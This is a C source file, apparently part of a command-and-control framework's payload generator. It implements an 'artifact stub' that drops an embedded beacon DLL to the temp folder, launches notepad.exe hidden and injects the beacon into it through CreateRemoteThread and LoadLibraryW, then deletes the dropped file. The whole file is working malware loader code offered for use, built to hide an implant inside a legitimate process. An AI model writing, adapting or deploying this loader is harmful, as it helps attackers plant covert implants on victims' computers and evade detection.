// exe_inject.c -- Artifact stub: remote process DLL injection.
//
// Writes beacon to %TEMP%, spawns TARGET (hidden), injects via
// CreateRemoteThread(LoadLibraryW), cleans up, exits.
// Beacon lives inside TARGET process.

#include "../artifact.h"

ART_DECLARE_PAYLOAD();

static const wchar_t TARGET[] = L"notepad.exe";

void __stdcall stub_main(void) {
    ART_RESOLVE_APIS();
    unsigned int sz = art_get_size(g_payload);
    if (!sz) ExitProcess(1);

    wchar_t tmppath[MAX_PATH + 1];
    if (!art_write_temp(tmppath, g_payload, sz)) ExitProcess(1);

    // Spawn target hidden.
    static STARTUPINFOW        si;
    static PROCESS_INFORMATION pi;
    wchar_t cmd[MAX_PATH + 1];

    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    lstrcpyW(cmd, TARGET);

    if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        DeleteFileW(tmppath);
        ExitProcess(1);
    }

    WaitForInputIdle(pi.hProcess, 5000);
    art_inject_remote(pi.hProcess, tmppath);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    DeleteFileW(tmppath);
    ExitProcess(0);
}
